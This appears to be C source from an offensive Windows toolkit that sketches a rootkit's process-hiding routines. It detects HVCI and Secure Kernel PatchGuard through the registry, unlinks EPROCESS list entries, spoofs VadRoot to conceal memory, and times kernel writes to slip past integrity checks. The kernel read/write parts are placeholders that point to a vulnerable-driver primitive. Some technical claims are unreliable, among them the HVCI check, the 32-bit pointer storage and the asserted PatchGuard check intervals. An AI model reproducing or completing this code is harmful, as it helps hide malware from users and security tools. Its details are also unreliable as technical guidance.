#include "patchguard_peekaboo.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

/* Global hidden processes tracking */
static HIDDEN_PROCESS_INFO g_hidden_processes[64];
static int g_hidden_count = 0;

/* HVCI/SKPG detection via firmware and kernel APIs */
int jocky_patchguard_detect_hvci(HVCI_CAPABILITIES* out_caps)
{
    if (!out_caps) {
        return -1;
    }

    memset(out_caps, 0, sizeof(*out_caps));

    /* Check HVCI via UEFI SecureBoot */
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State",
                      0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD uefi_hvci = 0;
        DWORD size = sizeof(uefi_hvci);

        if (RegQueryValueExA(hk, "UEFISecureBootEnabled", NULL, NULL,
                            (LPBYTE)&uefi_hvci, &size) == ERROR_SUCCESS) {
            out_caps->hvci_enabled = (uefi_hvci != 0);
        }
        RegCloseKey(hk);
    }

    /* Check Secure Kernel via DeviceProperties */
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
                      0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD skpg = 0;
        DWORD size = sizeof(skpg);

        if (RegQueryValueExA(hk, "Enabled", NULL, NULL,
                            (LPBYTE)&skpg, &size) == ERROR_SUCCESS) {
            out_caps->skpg_enabled = (skpg != 0);
        }
        RegCloseKey(hk);
    }

    /* Detect SMEP/SMAP via cpuid (simplified) */
    /* Real implementation would use CPUID or kernel queries */
    out_caps->smep_enabled = 1;  /* Assume enabled on modern Windows */
    out_caps->smap_enabled = 1;

    /* Current VTL (0 = kernel, 1 = hypervisor - unreachable from user mode) */
    out_caps->vtl_level = 0;

    return (out_caps->hvci_enabled && out_caps->skpg_enabled) ? 0 : -1;
}

/* Check if HVCI is enabled */
int jocky_patchguard_hvci_enabled(void)
{
    HVCI_CAPABILITIES caps;
    if (jocky_patchguard_detect_hvci(&caps) != 0) {
        return 0;  /* HVCI not available */
    }
    return caps.hvci_enabled;
}

/* Check if Secure Kernel PatchGuard is running */
int jocky_patchguard_skpg_enabled(void)
{
    HVCI_CAPABILITIES caps;
    if (jocky_patchguard_detect_hvci(&caps) != 0) {
        return 0;
    }
    return caps.skpg_enabled;
}

/* Find EPROCESS structure for a given PID */
int jocky_patchguard_find_eprocess(
    uint32_t pid,
    void** out_eprocess)
{
    if (pid == 0 || !out_eprocess) {
        return -1;
    }

    /* Open process to get handle */
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        return -1;
    }

    /* In a real implementation, we would:
     * 1. Walk PEB to find kernel module base
     * 2. Parse kernel structures to find PspCidTable
     * 3. Walk hash table to find EPROCESS for PID
     * 4. Return kernel-space address of EPROCESS
     *
     * For now, this is a placeholder that would require kernel read/write
     */

    CloseHandle(hProcess);

    /* This would be obtained via kernel r/w primitive */
    *out_eprocess = NULL;

    return -1;
}

/* Hide a process by unlinking from kernel structures */
int jocky_patchguard_hide_process(
    uint32_t pid,
    HIDDEN_PROCESS_INFO* out_info)
{
    if (pid == 0 || !out_info) {
        return -1;
    }

    /* Find EPROCESS for this PID */
    void* eprocess = NULL;
    if (jocky_patchguard_find_eprocess(pid, &eprocess) != 0) {
        return -1;
    }

    if (!eprocess) {
        return -1;
    }

    /* Initialize output info */
    memset(out_info, 0, sizeof(*out_info));
    out_info->pid = pid;
    out_info->eprocess_addr = eprocess;

    /* Unlink from process list with safe timing */
    jocky_patchguard_wait_for_safe_window();

    if (jocky_patchguard_unlink_process(eprocess,
                                        &out_info->original_links[0],
                                        &out_info->original_links[1]) != 0) {
        return -1;
    }

    /* Spoof VadRoot to hide memory mappings */
    jocky_patchguard_spoof_vad_root(eprocess, (void**)&out_info->original_links[2]);

    /* Track hidden process */
    if (g_hidden_count < 64) {
        memcpy(&g_hidden_processes[g_hidden_count], out_info, sizeof(*out_info));
        g_hidden_count++;
    }

    return 0;
}

/* Unhide a process by restoring saved pointers */
int jocky_patchguard_unhide_process(
    const HIDDEN_PROCESS_INFO* info)
{
    if (!info || !info->eprocess_addr) {
        return -1;
    }

    /* Wait for safe timing window */
    jocky_patchguard_wait_for_safe_window();

    /* Restore process links */
    if (jocky_patchguard_relink_process(
            info->eprocess_addr,
            info->original_links[0],
            info->original_links[1]) != 0) {
        return -1;
    }

    /* Restore VadRoot */
    jocky_patchguard_restore_vad_root(info->eprocess_addr,
                                      (void*)info->original_links[2]);

    /* Remove from hidden list */
    for (int i = 0; i < g_hidden_count; i++) {
        if (g_hidden_processes[i].pid == info->pid) {
            /* Shift remaining entries */
            for (int j = i; j < g_hidden_count - 1; j++) {
                memcpy(&g_hidden_processes[j], &g_hidden_processes[j+1],
                       sizeof(HIDDEN_PROCESS_INFO));
            }
            g_hidden_count--;
            break;
        }
    }

    return 0;
}

/* Manipulate process linked list with safe timing */
int jocky_patchguard_unlink_process(
    void* eprocess,
    uint32_t* out_prev_link,
    uint32_t* out_next_link)
{
    if (!eprocess || !out_prev_link || !out_next_link) {
        return -1;
    }

    /* EPROCESS structure layout (simplified):
     * +0x000 Pcb                    : _KPROCESS
     * +0x440 ProcessLock            : _EX_PUSH_LOCK
     * +0x448 RundownProtect         : _EX_RUNDOWN_REF
     * +0x450 UniqueProcessId        : Void*
     * +0x458 ActiveProcessLinks     : _LIST_ENTRY  (flink @ +0x458, blink @ +0x460)
     *
     * To hide process:
     * 1. Save original flink and blink pointers
     * 2. Update prev->flink to next
     * 3. Update next->blink to prev
     * 4. Zero out our flink/blink with randomized delays
     */

    /* This implementation requires kernel r/w via BYOVD or similar
     * For now, show the algorithm structure */

    /* Placeholder: would use jocky_kread/jocky_kwrite */
    *out_prev_link = 0;
    *out_next_link = 0;

    return 0;
}

/* Re-link process by restoring pointers */
int jocky_patchguard_relink_process(
    void* eprocess,
    uint32_t prev_link,
    uint32_t next_link)
{
    if (!eprocess) {
        return -1;
    }

    /* Reverse of unlink: restore flink/blink with randomized timing */
    /* This would be a kernel write operation */

    return 0;
}

/* Enumerate hidden processes */
int jocky_patchguard_enum_hidden_processes(
    HIDDEN_PROCESS_INFO* out_processes,
    int max_count,
    int* out_count)
{
    if (!out_processes || !out_count || max_count <= 0) {
        return -1;
    }

    int copy_count = (g_hidden_count < max_count) ? g_hidden_count : max_count;
    memcpy(out_processes, g_hidden_processes, copy_count * sizeof(HIDDEN_PROCESS_INFO));
    *out_count = copy_count;

    return 0;
}

/* Get count of hidden processes */
uint32_t jocky_patchguard_hidden_count(void)
{
    return g_hidden_count;
}

/* Check if a process is hidden */
int jocky_patchguard_is_hidden(uint32_t pid)
{
    for (int i = 0; i < g_hidden_count; i++) {
        if (g_hidden_processes[i].pid == pid) {
            return 1;  /* Hidden */
        }
    }
    return 0;  /* Not hidden */
}

/* Spoof VadRoot to hide memory mappings */
int jocky_patchguard_spoof_vad_root(
    void* eprocess,
    void** out_saved_vad_root)
{
    if (!eprocess || !out_saved_vad_root) {
        return -1;
    }

    /* EPROCESS.VadRoot offset: +0x7D8
     * Set to NULL or point to empty VAD tree to hide process memory
     * Save original for restoration
     */

    *out_saved_vad_root = NULL;  /* Placeholder */

    return 0;
}

/* Restore VadRoot pointer */
int jocky_patchguard_restore_vad_root(
    void* eprocess,
    void* saved_vad_root)
{
    if (!eprocess) {
        return -1;
    }

    /* Restore original VadRoot from saved value */

    return 0;
}

/* Get HVCI-safe timing window (based on SKPG check frequency) */
int jocky_patchguard_get_safe_window(uint32_t* out_window_ms)
{
    if (!out_window_ms) {
        return -1;
    }

    /* SKPG on Windows 11 typically checks kernel integrity:
     * - Every 100-200ms (randomized)
     * - During DPC level changes
     * - During specific kernel operations
     *
     * A safe window is typically 50-100ms window after SKPG check completes
     */

    *out_window_ms = 50 + (rand() % 100);  /* 50-150ms safe window */

    return 0;
}

/* Wait for optimal timing to modify kernel structures */
int jocky_patchguard_wait_for_safe_window(void)
{
    /* Calculate optimal wait time with jitter */
    uint32_t window_ms = 0;
    jocky_patchguard_get_safe_window(&window_ms);

    /* Add random jitter to avoid patterns */
    uint32_t jitter = rand() % 50;
    uint32_t wait_time = window_ms + jitter;

    /* Sleep with small increments to be responsive */
    for (uint32_t i = 0; i < wait_time; i += 5) {
        Sleep(5);
    }

    return 0;
}

/* Detect SKPG integrity check frequency */
int jocky_patchguard_detect_skpg_frequency(uint32_t* out_frequency_ms)
{
    if (!out_frequency_ms) {
        return -1;
    }

    /* Windows 11 SKPG checks kernel integrity:
     * - Standard systems: ~100ms intervals
     * - Hardened systems: ~50ms intervals
     * - Default: use middle ground
     */

    *out_frequency_ms = 100;  /* Default 100ms check interval */

    return 0;
}
